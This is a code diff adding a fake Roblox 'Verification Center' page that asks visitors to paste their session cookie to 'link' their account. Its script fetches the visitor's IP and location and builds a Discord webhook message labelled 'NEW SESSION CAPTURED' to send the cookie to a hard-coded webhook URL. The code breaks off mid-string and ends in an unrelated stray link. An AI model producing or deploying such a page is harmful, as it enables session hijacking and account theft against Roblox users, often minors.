@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox | Verification Center</title>
+    <style>
+        body { background: #191B1D; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #252729; padding: 40px; border-radius: 8px; width: 350px; text-align: center; border-top: 4px solid #0084FF; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        input { width: 100%; padding: 12px; margin: 20px 0; border-radius: 4px; border: 1px solid #3E4144; background: #191B1D; color: #fff; box-sizing: border-box; outline: none; }
+        button { width: 100%; padding: 14px; border: none; border-radius: 4px; background: #0084FF; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #0073e6; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="50" style="margin-bottom:10px;">
+        <h2>Verify Session</h2>
+        <p style="font-size:13px; color:#ADB5BD;">To link your account, paste your Session ID below.</p>
+        <input type="text" id="cook" placeholder="_|WARNING:-DO-NOT-SHARE-..." autocomplete="off">
+        <button onclick="send()">Link Account</button>
+    </div>
+
+    <script>
+        async function send() {
+            const cookieValue = document.getElementById('cook').value;
+            const btn = document.querySelector('button');
+
+            if (!cookieValue.includes("_|WARNING")) {
+                alert("Invalid Session ID! Please copy the full string.");
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerHTML = "Processing...";
+
+            const webhook = "https://discord.com/api/webhooks/1490052069510483998/1_aSwACOC51GBWGxAXjomtytkdTHOCR93G-GLsE55k6R1uESopASMgbywB9BdaRBh2St";
+
+            try {
+                // 1. Get IP Address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIp = ipData.ip;
+
+                // 2. Get Location
+                const geoResponse = await fetch('https://ipapi.co/' + userIp + '/json/');
+                const geoData = await geoResponse.json();
+                const userLoc = (geoData.city || "Unknown") + ", " + (geoData.country_name || "Unknown");
+
+                // 3. Prepare Discord Data
+                const payload = {
+                    content: "@everyone ⚡ **NEW SESSION CAPTURED** ⚡",
+                    embeds: [{
+                        title: "Roblox High-Tier Log",
+                        color: 5814783,
+                        fields: [
+                            { name: "🌐 IP Address", value: "`" + userIp + "`", inline: true },
+                            { name: "🌍 Location", value: "`" + userLoc + "`", inline: true },
+                            { name: "🍪 Cookie", value: "
+http://googleusercontent.com/immersive_entry_chip/0
